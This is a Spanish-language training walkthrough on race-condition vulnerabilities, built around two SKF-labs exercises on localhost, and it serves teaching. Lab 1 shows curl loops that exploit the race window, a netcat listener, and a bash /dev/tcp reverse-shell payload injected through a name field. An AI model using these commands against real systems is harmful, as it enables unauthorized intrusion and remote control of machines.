# Condiciones de carrera (Race Condition)

Tags: #RaceCondition #OWASP #Explotacion 

Las **condiciones de carrera** (también conocidas como **Race Condition**) son un tipo de vulnerabilidad que puede ocurrir en sistemas informáticos donde dos o más procesos o hilos de ejecución compiten por los mismos recursos sin que haya un mecanismo adecuado de sincronización para controlar el acceso a los mismos.

Esto significa que si dos procesos intentan acceder a un mismo recurso compartido al mismo tiempo, puede ocurrir que la salida de uno o ambos procesos sea impredecible, o incluso que se produzca un comportamiento no deseado en el sistema.

Los atacantes pueden aprovecharse de las condiciones de carrera para llevar a cabo ataques de denegación de servicio (**DoS**), sobreescribir datos críticos, obtener acceso no autorizado a recursos, o incluso ejecutar código malicioso en el sistema.

Por ejemplo, supongamos que dos procesos intentan acceder a un archivo al mismo tiempo: uno para leer y el otro para escribir. Si no hay un mecanismo adecuado para sincronizar el acceso al archivo, puede ocurrir que el proceso de lectura lea datos incorrectos del archivo, o que el proceso de escritura sobrescriba datos importantes que necesitan ser preservados.

El impacto de las condiciones de carrera en la seguridad depende de la naturaleza del recurso compartido y del tipo de ataque que se pueda llevar a cabo. En general, las condiciones de carrera pueden permitir a los atacantes acceder a recursos críticos, modificar datos importantes, o incluso tomar el control completo del sistema. Por lo tanto, es importante que los desarrolladores y administradores de sistemas tomen medidas para evitar y mitigar las condiciones de carrera en sus sistemas.

A continuación, se os comparte el enlace directo a los proyectos de Github los cuales estaremos empleando en esta clase para practicar las Race Condition:

-   **SKF-LABS Race Condition**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition)
-   **SKF-LABS Race Condition 2**: [https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition-file-write](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/RaceCondition-file-write)


## Race Condition 

* Lab 1: RaceCondition

![](Pasted%20image%2020230524121625.png)

Al momento de ingresar nuestro nombre miramos que se cambia la url. 

![](Pasted%20image%2020230524121713.png)

Después le daremos en boot! y nos mostrar el usuario que hemos ingresado, además de ver que en la URL tenemos otro valor.

![](Pasted%20image%2020230528161222.png)

![](Pasted%20image%2020230528161147.png)


Lo que hace la condición de carrera es, que antes de que te borre el archivo porque se acontece una validación de caracteres y no deja que coloquemos caracteres especiales como las comillas simples. Podríamos hacer que justo en ese momento antes de que nos borre el archivo, poder leer ese documento, ya que existe un pequeño margen. 

![](Pasted%20image%2020230528162751.png)

Aquí podemos leer el archivo y el pequeño margen antes de que sea borrado. 


* Para poder hacer el ataque y ver el contenido web de la maquina victima en nuestra consola. Nos pondremos en 'escucha'
```bash 
❯ while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep "Check this out" | htm2text | xargs | grep -vE "hola|Important|Default User"; done       
# Haremos un bucle infinito, mandando peticiones a la web victima, en donde solo vamos a ver el resultado del campo 'Check this out' y quitaremos las cadenas que no queremos que nos salgan como 'hola, important y default user'
```


![](Pasted%20image%2020230524121713.png)

Ahora en la URL podemos ver que en donde dice person, coloca el usuario que hemos ingresado anteriormente. Por lo que haciendo otro bucle infinito pero en este ocasión mandaremos esa query desde nuestra consola.

```bash 
❯ while true; do curl -s -X GET 'http://localhost:5000/?person='id'&action=validate'; done  # Mandaremos la query muchas veces para que en algun punto nos llegue a mostrar el contenido que queremos en la query de arriba
```

Cabe mencionar que esto no sale a la primera, sino que debemos de tener mucha paciencia para poder leer el contenido del archivo. 

![](Pasted%20image%2020230528164645.png)

Después de un rato, nos sale el output. Esto quiere decir que puede ejecutar comandos. 


* Por lo que ahora podríamos hacer una ReverShell de la siguiente manera. 
```bash
❯ nc -nlvp 443        # Nos ponemos en escucha en nuestra consola 
```

![](Pasted%20image%2020230528161147.png)

Vamos a la pagina y en el campo 'Your name', podemos colocar el siguiente comando. 
```bash 
❯ 'bash -c "bash -i >& /dev/tcp/192.168.68.1/443 0>&1"'            # Comando de la ReverShell
```



* Lab 2: RaceCondition-file-write

Ahora tenemos este tipo de escenario.
![](Pasted%20image%2020230528165442.png)

Si colocamos prueba en la url. Podremos descargar un recurso que se llamara siempre como 'Shared-file.txt'

![](Pasted%20image%2020230528165613.png)


El margen en esta ocasión es cuando mete el archivo y cuando nosotros lo descargamos. Entonces si existen muchos usuarios creando su usuario y descargando el archivo, es ahí donde se puede acontecer este tipo de vulnerabilidad de condición de carrera.

![](Pasted%20image%2020230528170353.png)

Supongamos que hay otro usuario que también esta solicitando su archivo, y lo llama 'testing'. 

![](Pasted%20image%2020230528170451.png)
Nosotros como usuarios estamos solicitando nuestro archivo llamado 'hola'.

Por lo que al momento de acontecerse este tipo de vulnerabilidad por la manera en que existen 'muchos' usuarios haciendo le petición y solicitando el 'mismo' archivo, en algún punto este les devolverá otra cosa.

![](Pasted%20image%2020230528170737.png)

![](Pasted%20image%2020230528170804.png)

Para poder ejecutar el race condition, debemos de hacer muchas solicitudes y es así como se se puede acontecer.



